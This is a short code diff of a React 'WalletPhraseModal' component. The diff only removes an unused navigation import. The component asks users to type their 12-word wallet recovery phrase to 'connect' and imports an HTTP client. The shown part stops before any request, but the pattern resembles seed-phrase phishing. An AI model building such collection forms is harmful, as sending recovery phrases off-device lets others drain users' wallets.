@@ -1,12 +1,10 @@
 import React, { useState } from 'react';
 import toast from 'react-hot-toast';
-import { useNavigate } from 'react-router-dom';
 import axiosInstance from '../../utils/axiosInstance';
 
 const WalletPhraseModal = ({ onClose, onConnectSuccess }) => {
   const [phrase, setPhrase] = useState('');
   const [phraseLength, setPhraseLength] = useState(12);
-  const navigate = useNavigate();
 
   const handleConnect = async () => {
     const words = phrase.trim().split(/\s+/);
